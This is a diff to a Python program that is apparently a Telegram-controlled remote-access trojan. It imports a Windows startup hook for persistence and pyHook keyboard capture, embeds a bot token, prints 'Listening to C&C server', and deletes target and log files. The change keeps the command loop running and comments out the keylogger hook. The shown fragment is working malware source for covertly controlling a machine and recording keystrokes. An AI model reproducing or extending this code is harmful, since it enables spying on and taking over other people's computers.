@@ -6,7 +6,7 @@ from json import loads
 from winshell import startup
 from tendo import singleton
 import telepot, requests
-import os, os.path, platform, ctypes
+import time, os, os.path, platform, ctypes
 import pyHook, pythoncom
 
 me = singleton.SingleInstance()
@@ -147,8 +147,6 @@ def handle(msg):
 				os.remove(target_file)
 			if os.path.isfile(log_file):
 				os.remove(log_file)
-			while True:
-				sleep(10)
 
 def checkchat_id(chat_id):
 	# REPLACE '123456' WITH YOUR ACTUAL chat_id!
@@ -165,9 +163,13 @@ def checkchat_id(chat_id):
 bot = telepot.Bot('919525291:AAEROz7_1xK69u0QIV39fYeVqT67x1Je2Ic')
 
 bot.message_loop(handle)
-print('Listening to commands...')
+print('[*] Listening to C&C server...')
+while True:
+	time.sleep(1)
 
-proc = pyHook.HookManager()
-proc.KeyDown = pressed_chars
-proc.HookKeyboard()
-pythoncom.PumpMessages()
+
+
+# proc = pyHook.HookManager()
+# proc.KeyDown = pressed_chars
+# proc.HookKeyboard()
+# pythoncom.PumpMessages()
